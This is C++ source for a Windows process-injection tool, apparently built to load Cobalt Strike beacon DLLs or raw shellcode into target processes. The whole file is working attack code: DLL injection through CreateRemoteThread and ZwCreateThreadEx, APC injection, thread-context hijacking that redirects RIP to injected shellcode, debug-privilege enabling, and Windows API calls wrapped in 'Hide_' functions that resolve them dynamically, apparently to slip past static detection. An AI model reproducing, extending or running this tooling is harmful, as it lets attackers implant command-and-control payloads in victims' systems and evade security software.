#include<iostream>
#include<tchar.h>
#include <cstring>
#include<Windows.h>
#include<Tlhelp32.h>
using namespace std;

DWORD Hide_ResumeThread(
	_In_ HANDLE hThread
)
{
typedef DWORD (WINAPI *Fn_ResumeThread)(
	_In_ HANDLE hThread
);
HMODULE ResumeThreadHandle = GetModuleHandleW(L"Kernel32.dll");
Fn_ResumeThread ptr = (Fn_ResumeThread)GetProcAddress(ResumeThreadHandle, "ResumeThread");
return ptr(hThread);
}
BOOL  Hide_SetThreadContext(
	_In_ HANDLE hThread,
	_In_ CONST CONTEXT* lpContext
)
{
typedef	BOOL (WINAPI *Fn_SetThreadContext)(
			_In_ HANDLE hThread,
			_In_ CONST CONTEXT * lpContext
		);
HMODULE SetThreadContextHandle = GetModuleHandleW(L"Kernel32.dll");
Fn_SetThreadContext ptr = (Fn_SetThreadContext)GetProcAddress(SetThreadContextHandle, "SetThreadContext");
return ptr(hThread,lpContext);
}
BOOL Hide_GetThreadContext(
	_In_ HANDLE hThread,
	_Inout_ LPCONTEXT lpContext
) 
{
typedef	BOOL (WINAPI *Fn_GetThreadContext)(
			_In_ HANDLE hThread,
			_Inout_ LPCONTEXT lpContext
		);
HMODULE GetThreadContextHandle = GetModuleHandleW(L"Kernel32.dll");
Fn_GetThreadContext ptr = (Fn_GetThreadContext)GetProcAddress(GetThreadContextHandle, "GetThreadContext");
return ptr(hThread,lpContext);
}
DWORD Hide_SuspendThread(
	_In_ HANDLE hThread
)
{
	typedef DWORD (WINAPI *Fn_SuspendThread)(
			_In_ HANDLE hThread
		);
	HMODULE suspendHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_SuspendThread ptr = (Fn_SuspendThread)GetProcAddress(suspendHandle, "SuspendThread");
	return ptr(hThread);
}

HANDLE Hide_CreateToolhelp32Snapshot(
	DWORD dwFlags,
	DWORD th32ProcessID
)
{
	typedef HANDLE (WINAPI *Fn_CreateToolhelp32Snapshot)(
			DWORD dwFlags,
			DWORD th32ProcessID
		);
	HMODULE CreateToolhelp32SnapshotHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_CreateToolhelp32Snapshot ptr = (Fn_CreateToolhelp32Snapshot)GetProcAddress(CreateToolhelp32SnapshotHandle, "CreateToolhelp32Snapshot");
	return ptr(dwFlags,th32ProcessID);
}
HANDLE Hide_OpenThread(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL bInheritHandle,
	_In_ DWORD dwThreadId
)
{
	typedef	HANDLE(WINAPI* Fn_OpenThread)(
		_In_ DWORD dwDesiredAccess,
		_In_ BOOL bInheritHandle,
		_In_ DWORD dwThreadId
		);
	HMODULE OpenThreadHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_OpenThread ptr = (Fn_OpenThread)GetProcAddress(OpenThreadHandle, "OpenThread");
	return ptr(dwDesiredAccess, bInheritHandle, dwThreadId);
}

HANDLE  Hide_CreateRemoteThread(
	_In_ HANDLE hProcess,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_ SIZE_T dwStackSize,
	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
	_In_opt_ LPVOID lpParameter,
	_In_ DWORD dwCreationFlags,
	_Out_opt_ LPDWORD lpThreadId
)
{
	typedef	HANDLE(WINAPI* FN_CreateRemoteThread)(
		_In_ HANDLE hProcess,
		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
		_In_ SIZE_T dwStackSize,
		_In_ LPTHREAD_START_ROUTINE lpStartAddress,
		_In_opt_ LPVOID lpParameter,
		_In_ DWORD dwCreationFlags,
		_Out_opt_ LPDWORD lpThreadId
		);
	HMODULE CreateRemoteThreadHandle = GetModuleHandleW(L"Kernel32.dll");
	FN_CreateRemoteThread ptr = (FN_CreateRemoteThread)GetProcAddress(CreateRemoteThreadHandle, "CreateRemoteThread");
	return ptr(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

 BOOL Hide_ReadFile(
	_In_ HANDLE hFile,
	_Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
	_In_ DWORD nNumberOfBytesToRead,
	_Out_opt_ LPDWORD lpNumberOfBytesRead,
	_Inout_opt_ LPOVERLAPPED lpOverlapped
	)
 {
	 typedef BOOL(WINAPI* Fn_ReadFile)(
		 _In_ HANDLE hFile,
		 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
		 _In_ DWORD nNumberOfBytesToRead,
		 _Out_opt_ LPDWORD lpNumberOfBytesRead,
		 _Inout_opt_ LPOVERLAPPED lpOverlapped
		 );
	 HMODULE ReadFileHandle = GetModuleHandleW(L"Kernel32.dll");
	 Fn_ReadFile ptr = (Fn_ReadFile)GetProcAddress(ReadFileHandle, "ReadFile");
	 return ptr(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
 }

 DWORD Hide_GetFileSize(
	 _In_ HANDLE hFile,
	 _Out_opt_ LPDWORD lpFileSizeHigh
	 )
 {
	 typedef DWORD(WINAPI* Fn_GetFileSize)(
		 _In_ HANDLE hFile,
		 _Out_opt_ LPDWORD lpFileSizeHigh
		 );
	 HMODULE ReadFileHandle = GetModuleHandleW(L"Kernel32.dll");
	 Fn_GetFileSize ptr = (Fn_GetFileSize)GetProcAddress(ReadFileHandle, "GetFileSize");
	 return ptr(hFile,lpFileSizeHigh);
 }

 HANDLE   Hide_CreateFileW(
	 _In_ LPCWSTR lpFileName,
	 _In_ DWORD dwDesiredAccess,
	 _In_ DWORD dwShareMode,
	 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	 _In_ DWORD dwCreationDisposition,
	 _In_ DWORD dwFlagsAndAttributes,
	 _In_opt_ HANDLE hTemplateFile
 )

 {
	 typedef HANDLE(WINAPI* Fn_CreateFileW)(
		 _In_ LPCWSTR lpFileName,
		 _In_ DWORD dwDesiredAccess,
		 _In_ DWORD dwShareMode,
		 _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		 _In_ DWORD dwCreationDisposition,
		 _In_ DWORD dwFlagsAndAttributes,
		 _In_opt_ HANDLE hTemplateFile
		 );
	 HMODULE CreateFileHandle = GetModuleHandleW(L"Kernel32.dll");
	 Fn_CreateFileW ptr = (Fn_CreateFileW)GetProcAddress(CreateFileHandle, "CreateFileW");
	 return ptr(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile); 
 }

HANDLE Hide_OpenProcess(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL bInheritHandle,
	_In_ DWORD dwProcessId
)
{
	typedef HANDLE(WINAPI* Fn_OpenProcess)(
		_In_ DWORD dwDesiredAccess,
		_In_ BOOL bInheritHandle,
		_In_ DWORD dwProcessId
		);
	HMODULE OpenProcessHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_OpenProcess ptr = (Fn_OpenProcess)GetProcAddress(OpenProcessHandle, "OpenProcess");
	return ptr(dwDesiredAccess, bInheritHandle, dwProcessId);
}
DWORD Hide_QueueUserAPC(
	_In_ PAPCFUNC pfnAPC,
	_In_ HANDLE hThread,
	_In_ ULONG_PTR dwData
)
{
	typedef DWORD(WINAPI* Fn_QueueUserAPC)(
		_In_ PAPCFUNC pfnAPC,
		_In_ HANDLE hThread,
		_In_ ULONG_PTR dwData
		);
	HMODULE QueueUserAPCHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_QueueUserAPC ptr = (Fn_QueueUserAPC)GetProcAddress(QueueUserAPCHandle, "QueueUserAPC");
	return ptr(pfnAPC, hThread, dwData);

}
LPVOID Hide_VirtualAllocEx(
	_In_ HANDLE hProcess,
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect
)
{
	typedef LPVOID(WINAPI* Fn_VirtualAllocEx)(
		_In_ HANDLE hProcess,
		_In_opt_ LPVOID lpAddress,
		_In_ SIZE_T dwSize,
		_In_ DWORD flAllocationType,
		_In_ DWORD flProtect
		);
	HMODULE	VirtualAllocExHandle = GetModuleHandleW(L"Kernel32.dll");
	Fn_VirtualAllocEx ptr = (Fn_VirtualAllocEx)GetProcAddress(VirtualAllocExHandle, "VirtualAllocEx");
	return ptr(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL Hide_WriteProcessMemory(
	_In_ HANDLE hProcess,
	_In_ LPVOID lpBaseAddress,
	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
	_In_ SIZE_T nSize,
	_Out_opt_ SIZE_T* lpNumberOfBytesWritten
) {
	typedef BOOL(*Fn_WriteProcessMemory)(
		_In_ HANDLE hProcess,
		_In_ LPVOID lpBaseAddress,
		_In_reads_bytes_(nSize) LPCVOID lpBuffer,
		_In_ SIZE_T nSize,
		_Out_opt_ SIZE_T* lpNumberOfBytesWritten
		);

	HMODULE	WriteProcessMemoryHandle = GetModuleHandleW(L"KernelBase.dll");
	Fn_WriteProcessMemory ptr = (Fn_WriteProcessMemory)GetProcAddress(WriteProcessMemoryHandle, "WriteProcessMemory");
	return ptr(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}


BOOL EnableDebugPrivilege()
{
	HANDLE hToken;
	BOOL fOk = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return fOk;
}

DWORD GetProcessPID(LPCTSTR lpProcessName)
{
	DWORD Ret = 0;
	PROCESSENTRY32 p32;
	HANDLE lpSnapshot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (lpSnapshot == INVALID_HANDLE_VALUE)
	{
		return Ret;
	}
	p32.dwSize = sizeof(PROCESSENTRY32);
	::Process32First(lpSnapshot, &p32);
	do {
		if (!lstrcmp(p32.szExeFile, lpProcessName))
		{
			Ret = p32.th32ProcessID;
			break;
		}
	} while (::Process32Next(lpSnapshot, &p32));
	::CloseHandle(lpSnapshot);
	return Ret;
}

void APCInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	HANDLE TargetHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
	if (TargetHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}

	//2.远程申请内存
	DWORD length = (wcslen(dllpath) + 2) * sizeof(TCHAR);
	PVOID RemoteMemory = Hide_VirtualAllocEx(TargetHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (RemoteMemory == NULL)
	{
		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将上线的DLL的路径写入内存

	BOOL WriteStatus = Hide_WriteProcessMemory(TargetHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}
	//4.获取LoadLibrary的函数地址
	FARPROC LoadLibraryAddress = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryW");
	if (LoadLibraryAddress == NULL)
	{
		cout << "	[-] Get LoadLibrary's Address Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Get LoadLibrary's Address Successfully :)" << endl;
	}
	//5.创建线程快照并且插入APC函数
	HANDLE SnapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (SnapShot == INVALID_HANDLE_VALUE)
	{
		cout << "	[-] Taking Thread Snap Shot Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Taking Thread Snap Shot Successfully :)" << endl;
	}
	//定义线程信息结构体,并且初始化
	THREADENTRY32 te = { 0 };
	te.dwSize = sizeof(te);
	//然后就是遍历快照中的线程,进行插入
	int flag = 0;                  //判断APC是否插入成功
	HANDLE ThreadHandle = NULL;    //用于获取目标线程句柄
	if (Thread32First(SnapShot, &te))
	{
		//不想do while循环,所以我就直接先进行一次
		//判断目标线程的进程ID是否是我们要注入的进程的ID
		if (te.th32OwnerProcessID == pid)
		{
			ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
			if (ThreadHandle)
			{
				DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
				if (dwRet == TRUE)
				{
					flag++;
				}
			}
			ThreadHandle = NULL;  //清除句柄
		}

		while (Thread32Next(SnapShot, &te))  //遍历完毕就会停止
		{
			if (te.th32OwnerProcessID == pid)
			{
				ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
				if (ThreadHandle)
				{
					DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
					if (dwRet == TRUE)
					{
						flag++;
					}
				}
				ThreadHandle = NULL;  //清除句柄
			}
		}
		CloseHandle(TargetHandle);
		CloseHandle(SnapShot);
		CloseHandle(ThreadHandle);
		if (flag == 0)
		{
			cout << "	[-] APC Inject Failed :(" << endl;
			return;
		}
		else
		{
			cout << "	[+] APC Inj&ct Successfully !! Enj0y Hacking Time :) !" << endl;
		}
	}
}

void RemoteThreadHiJacking(DWORD targetPID, LPCWSTR binPath)
{
	unsigned char* tempbuffer = NULL;
	DWORD          fileLength = 0;
	HANDLE         fileHandle = NULL;
	fileHandle = Hide_CreateFileW(binPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	fileLength = Hide_GetFileSize(fileHandle, NULL);
	
	tempbuffer = (unsigned char*)malloc(fileLength);
	Hide_ReadFile(fileHandle, tempbuffer, fileLength, NULL, NULL);

	DWORD resumeCount = 0;
	DWORD suspendCount = 0;
	HANDLE targetProcessHandle;
	unsigned char* remoteShellCodeBuffer;
	HANDLE targetThreadHandle = NULL;
	HANDLE snapShot;
	THREADENTRY32 t32;
	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	t32.dwSize = sizeof(THREADENTRY32);

	targetProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteShellCodeBuffer = (unsigned char*)Hide_VirtualAllocEx(targetProcessHandle, NULL, sizeof(tempbuffer), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	
	Hide_WriteProcessMemory(targetProcessHandle, remoteShellCodeBuffer, tempbuffer, fileLength, NULL);

	snapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapShot, &t32);

	while (Thread32Next(snapShot, &t32))
	{
		if (t32.th32OwnerProcessID == targetPID)
		{
			targetThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, t32.th32ThreadID);
			break;
		}
	}
	Hide_SuspendThread(targetThreadHandle);
	if (suspendCount == (DWORD)-1)
	{
		cout << "	[-]Suspend Target Thread Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Suspend Target Thread Successfully :)" << endl;
	}
	if (!Hide_GetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Get Target Thread Context Failed :(" << endl;
		goto end;
	}
	else
	{
		cout << "	[+] Get Target Thread Successfully :)" << endl;
	}
	ThreadCtx.Rip = (DWORD_PTR)remoteShellCodeBuffer;
	if (!Hide_SetThreadContext(targetThreadHandle, &ThreadCtx))
	{
		cout << "	[-]Set Target Thread Context Failed :(";
		goto end;
	}
	else
	{
		cout << "	[+] Set Target Thread Context Successfully :)" << endl;
	}
	resumeCount = Hide_ResumeThread(targetThreadHandle);
	if (resumeCount == (DWORD)-1) {
		cout << "	[-] Resume Target Thread Failed :(" << endl;
	}
	else
	{
		cout << "	[+] Resume Target Thread Successfully :)" << endl;
	}
	cout << "	[+] Remote Thread HiJa&king Successfully ! Enj0y Hacking Time :)" << endl;
end:
	CloseHandle(snapShot);
	CloseHandle(targetProcessHandle);
	CloseHandle(targetThreadHandle);
}

void TraverseProcess(LPCWSTR ProcessName)
{
	int cnt = 0;
	HANDLE snapShot;
	PROCESSENTRY32 p32 = { 0 };
	p32.dwSize = sizeof(PROCESSENTRY32);

	snapShot = Hide_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapShot, &p32);

	cout << "	[+] Below Are The Process PID :) " << endl;
	do {

		if (!lstrcmp(p32.szExeFile, (LPCWSTR)ProcessName)) {
			cnt++;
			cout << p32.th32ProcessID << endl;
		}
	} while (Process32Next(snapShot, &p32));

	if (cnt == 0)
	{
		cout << "	[-] Process PID Not Found :(" << endl;
		return;
	}
	cout << "	[+] Which Thread's PID Do You Wanna HiJack :)" << endl;
	cout << "	[!] This May Cause Process Collapse , Watch Out [!]" << endl;
}

void DLLInject(DWORD pid, LPCWSTR dllpath)
{
	//1.获取句柄
	
	HANDLE OriginalProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (OriginalProcessHandle == NULL)
	{
		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;

		if (EnableDebugPrivilege() == TRUE)
		{
			cout << "	[-] Is This EXE Opened? :(" << endl;
		}
		else {
			cout << "	[-] Please Run This Under Administrator Role :(" << endl;
		}
		return;
	}
	else {
		cout << "	[+] Get OriginalProcessHandle Successfully :)" << endl;
	}
	//2.远程申请内存
	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);

	PVOID  RemoteMemory = Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);

	if (RemoteMemory == NULL)
	{

		cout << "	[-] VirtualAlloc Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] VirtualAlloc Address Successfully :)" << endl;
	}
	//3.将CS上线的DLL写入内存
	BOOL WriteStatus = Hide_WriteProcessMemory(OriginalProcessHandle, RemoteMemory, dllpath, length, NULL);
	if (WriteStatus == 0)
	{
		cout << "	[-] Write CS's DLL Into Memory Failed :(" << endl;
		return;
	}
	else
	{
		cout << "	[+] Write CS's DLL Into Memory Successfully :)" << endl;
	}

	//4.获取LoadLibrary地址
	FARPROC LoadLibraryHandle = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	//5.声明ZwCreateThreadEx函数
#ifdef _WIN64
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	//6.获取NTDLL中ZwCreateThreadEx函数
	typedef_ZwCreateThreadEx  ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwCreateThreadEx");
	if (ZwCreateThreadEx == NULL)
	{
		cout << "	[-] Get ZwCreateThreadEx Address Failed :(" << endl;
		return;
	}
	else {
		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
	}
	//5.创建线程 ring3调用CreateRemoteThread
	HANDLE RemoteHandle = Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
	if (RemoteHandle == NULL)
	{
		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
		return;

	}
	else {
		cout << "	[+] Ring3 Thread Inject Successfully :)" << endl;
	}

	//7.创建线程  ring0调用ZwCreateThreadEx
	HANDLE hRemoteThread;
	DWORD Status = 0;
	Status = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, OriginalProcessHandle, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, 0, 0, 0, NULL);
	if (Status == NULL)
	{
		cout << "	[+] Ring0 Thread Inject Successfully :)" << endl;
	}
	else
	{
		cout << "	[-] Ring0 Thread Inject Failed :(" << endl;
		return;
	}
	WaitForSingleObject(RemoteHandle, -1);
	//8.释放DLL空间
	VirtualFreeEx(OriginalProcessHandle, RemoteMemory, length, MEM_COMMIT);
	//9.关闭句柄
	CloseHandle(OriginalProcessHandle);
	CloseHandle(ZwCreateThreadEx);
	cout << "	[+] DLL inj&ct successfu11y !! Enj0y Hacking Time :) !" << endl;
}

void Banner(int type)
{
	if (type == 1)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_BLUE);
		std::cout << "________  .____    .____      .___            __               __   \n"
			"\\______ \\ |    |   |    |     |   | ____     |__| ____   _____/  |_ \n"
			" |    |  \\|    |   |    |     |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			" |    `   \\    |___|    |___  |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"/_______  /_______ \\_______ \\ |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/        \\/       \\/          \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else if (type == 2)
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
		std::cout << "   _____ ___________________   .___            __               __   \n"
			"  /  _  \\\\______   \\_   ___ \\  |   | ____     |__| ____   _____/  |_ \n"
			" /  /_\\  \\|     ___/    \\  \\/  |   |/    \\    |  |/ __ \\_/ ___\\   __\\\n"
			"/    |    \\    |   \\     \\____ |   |   |  \\   |  \\  ___/\\  \\___|  |  \n"
			"\\____|__  /____|    \\______  / |___|___|  /\\__|  |\\___  >\\___  >__|  \n"
			"        \\/                 \\/           \\/\\______|    \\/     \\/      \n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	else
	{
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

		// 设置控制台文本颜色为红色
		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
		std::cout << "                              __________                       __                                                \n"
			"                              \\______   \\ ____   _____   _____/  |_  ____                                       \n"
			"                               |       _// __ \\ /     \\ /  _ \\   __\\/ __ \\                                      \n"
			"                               |    |   \\  ___/|  Y Y  (  <_> )  | \\  ___/                                      \n"
			"                               |____|_  /\\___  >__|_|  /\\____/|__|  \\___  >                                     \n"
			"                                      \\/     \\/      \\/                 \\/                                      \n"
			"__________.__                              .___   ___ ___ .__     ____.              __   .__.__                \n"
			"\\______   \\  |_________   ____ _____     __| _/  /   |   \\|__|   |    |____    ____ |  | _|__|__| ____    ____  \n"
			" |       _/  |  \\_  __ \\_/ __ \\\\__  \\   / __ |  /    ~    \\  |   |    \\__  \\ _/ ___\\|  |/ /  |  |/    \\  / ___\\ \n"
			" |    |   \\   Y  \\  | \\/\\  ___/ / __ \\_/ /_/ |  \\    Y    /  /\\__|    |/ __ \\  \\___|    <|  |  |   |  \\/ /_/  >\n"
			" |____|_  /___|  /__|    \\___  >____  /\\____ |   \\___|_  /|__\\________(____  /\\___  >__|_ \\__|__|___|  /\\___  / \n"
			"        \\/     \\/            \\/     \\/      \\/         \\/                  \\/     \\/     \\/          \\/ /_____/\n";

		SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
	}
	cout << endl << "	    Under the sun,there is no secure system!!" << endl << "	        Scripted By Whoami@127.0.0.1  :》" << endl << "	          Color Picked By Icy Water :)" << endl;
	if (EnableDebugPrivilege() == TRUE)
	{

		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[+] Privilege Elevated Successfully, Now You Have Bypassed UAC :) " << endl;
	}
	else {
		cout << "-----------------------------!!START!!--------------------------------" << endl;
		cout << "	[-] Privilege Elevated Failed, You Haven't Bypassed UAC :( " << endl;
	}
}

void TrashData()
{
	int* data = (int*)malloc(70000 * sizeof(int));
	for (int i = 0; i < 70000; i++)
	{
		data[i] = i;

	}
	for (int i = 0; i < 70000; i++)
	{
		printf("%d", data[i]);
	}
	std::cout << "\033[2J\033[1;1H";
}

int _tmain(int argc, TCHAR* argv[])
{
	if (argc == 3) {
		cout << "	    Which kind of Injection do you want?" << endl;
		cout << "	    [1]: DLLInject" << endl << "	    [2]: APCInject" << endl << "	    [3]: ThreadHiJacking" << endl;
		int type = 0;
		cin >> type;
		Banner(type);
		if (type == 1) //DLLInject
 		{	
			DWORD PID = GetProcessPID(argv[1]);
			cout << PID << endl;
			DLLInject(PID, argv[2]);
		}
		else if (type == 2)  //APCInject
		{
			DWORD PID = GetProcessPID(argv[1]);
			APCInject(PID, argv[2]);

		}
		else if (type == 3)   //ThreadHiJacking 
		{
			TraverseProcess(argv[1]);
			DWORD ProcessPID;
			cin >> ProcessPID;
			RemoteThreadHiJacking(ProcessPID,argv[2]);
		}
		else{
			TrashData();
		cout << "	[-] Please choose the number below :(" << endl;
			return 0;
		}
	}
	else
	{
		TrashData();
		cout << "	[-] Two Parameters are required" << endl;
		return 0;
	}

	return 0;
}